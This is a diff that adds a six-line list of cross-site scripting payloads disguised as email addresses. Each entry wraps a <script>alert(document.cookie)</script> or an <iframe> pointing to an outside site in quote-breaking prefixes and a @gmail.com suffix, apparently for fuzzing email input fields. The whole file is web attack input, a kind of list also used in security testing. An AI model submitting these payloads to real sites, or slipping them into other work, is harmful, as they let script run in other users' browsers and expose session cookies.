@@ -1,0 +1,6 @@
+>"<iframe src=http://vulnerability-lab.com/>@gmail.com
+>"<script>alert(document.cookie)</script><div style="1@gmail.com
+>"<script>alert(document.cookie)</script>@gmail.com
+<iframe src=http://vulnerability-lab.com/>@gmail.com
+<script>alert(document.cookie)</script><div style="1@gmail.com
+<script>alert(document.cookie)</script>@gmail.com
